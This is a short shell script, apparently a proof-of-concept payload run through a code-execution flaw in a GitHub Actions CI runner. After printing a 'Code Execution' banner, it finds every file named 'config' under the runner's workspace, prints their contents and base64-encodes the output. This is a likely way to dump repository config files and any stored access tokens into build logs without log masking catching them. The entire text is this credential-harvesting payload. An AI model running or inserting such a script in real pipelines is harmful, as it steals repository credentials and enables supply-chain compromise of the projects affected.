#!/bin/sh
echo "PumpKinf.... Code Execution"
find /home/runner/work/. -type f -name config | xargs cat | base64;
